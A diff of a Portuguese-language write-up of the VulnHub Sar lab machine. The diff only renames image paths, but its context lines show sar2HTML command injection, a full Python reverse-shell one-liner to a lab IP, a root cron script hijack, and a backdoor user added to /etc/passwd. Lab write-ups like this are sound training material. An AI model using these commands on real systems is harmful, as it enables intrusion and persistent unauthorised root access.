@@ -46,7 +46,7 @@ Rodamos o gobuster nele
 gobuster dir -u http://192.168.56.110 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 100
 ```
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/gobuster.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/gobuster.png)
 
 Achamos o **phpinfo.php** e o **robots.txt**
 
@@ -54,13 +54,13 @@ Achamos o **phpinfo.php** e o **robots.txt**
 
 Verificando o Robots.txt
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/robots.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/robots.png)
 
 Interessante... **sar2HTML**
 
 Vamos pesquisar o que é isso, ao entrarmos na página web, temos uma surpresa
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/sar.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar.png)
 
 # Exploração sarHTML
 
@@ -68,11 +68,11 @@ Então vamos procurar por exploits para ele
 
 **sar2html Ver 3.2.1**
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/sar1.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar1.png)
 
 https://www.exploit-db.com/exploits/47204
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/sar2.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar2.png)
 
 ```
 In web application you will see index.php?plot url extension.
@@ -84,7 +84,7 @@ output will appear bottom side of the scroll screen.
 
 Então executamos! Conseguimos ler o /etc/passwd!
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/sar3.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar3.png)
 
 # Reverse Shell
 
@@ -92,7 +92,7 @@ Testei vários reverses shells, o que deu certo foi em python
 
 **python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'**
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/rev.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/rev.png)
 
 Vamos iniciar a escalação de privilégios
 
@@ -100,29 +100,29 @@ Vamos iniciar a escalação de privilégios
 
 Primeira coisa é rodar o linpeas
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/linpeas.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas.png)
 
 Baixamos pra máquinas
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/linpeas1.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas1.png)
 
 Executamos nela
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/linpeas3.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas3.png)
 
 Encontramos um cron que nos chamou atenção!
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/linpeas4.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas4.png)
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/linpeas6.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas6.png)
 
 Verificamos mais de perto ela
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/cron.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron.png)
 
 Hummm... ele executa um script no /var/www/html como root, interessante, vamos até lá ver o que podemos extrair de bom
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/cron1.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron1.png)
 
 1 - Verificamos que para alterar o script devemos ser root.
 
@@ -144,7 +144,7 @@ Apenas adicionamos nosso reverse nele e esperamos ele executar
 
 Somos root!
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/cron2.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron2.png)
 
 ## Persistência
 
@@ -154,20 +154,20 @@ Para adicinar persistência nele vamos colocar um usuário no passwd, pra poderm
 
 hacker:senha
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/cron3.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron3.png)
 
 Esperamos ele executar de novo o cron e verificamos o /etc/passwd
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/cron4.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron4.png)
 
 Acessamos via sudo hacker
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/cron6.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron6.png)
 
 # Flags
 
 Pegamos as flags de user e root
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/user.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/user.png)
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar/root.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/root.png)
